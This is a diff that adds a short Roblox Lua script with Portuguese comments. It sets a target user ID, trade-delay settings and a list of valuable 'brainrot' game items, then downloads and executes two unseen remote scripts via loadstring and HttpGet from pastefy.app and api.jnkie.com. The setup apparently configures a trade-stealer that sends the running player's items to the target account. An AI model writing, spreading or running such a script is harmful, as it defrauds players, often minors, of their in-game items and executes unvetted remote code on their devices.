@@ -1,0 +1,44 @@
+-- CONFIG
+getgenv().SECRET_KEY = "BDB9DB582419288D15AFD3A59DA88C06"
+getgenv().TARGET_ID = 10464189078
+getgenv().DELAY_STEP = 1
+getgenv().TRADE_CYCLE_DELAY = 2
+
+getgenv().TARGET_BRAINROTS = {
+    ["Headless Horseman"] = true,
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Ganganzelli Trulala"] = true,
+    ["Antonio"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Rhino Helicopterino"] = true,
+    ["Signore Carapace"] = true,
+    ["Arcadragon"] = true,
+    ["Foxini Lanternini"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Fishino Clownino"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Love Love Bear"] = true,
+    ["Ginger Gerat"] = true,
+    ["Digi Narwhal"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Dug dug dug"] = true,
+    ["Kalika Bros"] = true,
+    ["La Casa Boo"] = true,
+    ["Reinito Sleighito"] = true,
+    ["1x1x1x1"] = true,
+    ["25"] = true,
+    ["67"] = true
+}
+
+-- EXECUTA PRIMEIRO SCRIPT
+loadstring(game:HttpGet("https://pastefy.app/RlAPK90a/raw"))()
+
+task.wait(2)
+
+-- EXECUTA SEGUNDO SCRIPT
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/752793106aac832ba8ddd9d8718e3189d73b69680acd7616ff256c77d42ac9d3/download"))()
